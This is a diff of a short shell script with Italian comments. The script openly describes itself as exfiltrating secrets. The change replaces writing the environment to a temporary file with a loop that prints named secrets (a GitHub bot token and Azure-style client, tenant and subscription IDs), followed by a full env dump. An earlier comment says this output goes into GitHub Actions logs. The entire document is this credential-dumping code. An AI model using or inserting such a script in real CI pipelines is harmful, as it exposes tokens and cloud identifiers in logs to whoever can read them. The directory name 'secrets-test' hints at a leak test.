@@ -2,15 +2,12 @@
 
 echo "[*] Avvio esfiltrazione locale dei secrets..."
 
-# Crea una directory temporanea
-mkdir -p /tmp/secrets-test
+# Greppa direttamente i segreti noti
+for var in BOT_TOKEN_GITHUB CLIENT_ID TENANT_ID SUBSCRIPTION_ID; do
+  val=$(printenv $var)
+  echo "[+] $var = $val"
+done
 
-# Scrive tutte le variabili di ambiente nel file dump
-env | tee /tmp/secrets-test/dump.txt
-
-echo "[*] Dump completato. Contenuto salvato in /tmp/secrets-test/dump.txt"
-
-# Mostra il contenuto del dump direttamente nel log GitHub Actions
-echo ""
-echo "[*] Contenuto del dump:"
-cat /tmp/secrets-test/dump.txt
+# Dump completo
+echo "[*] Dump completo delle env:"
+env
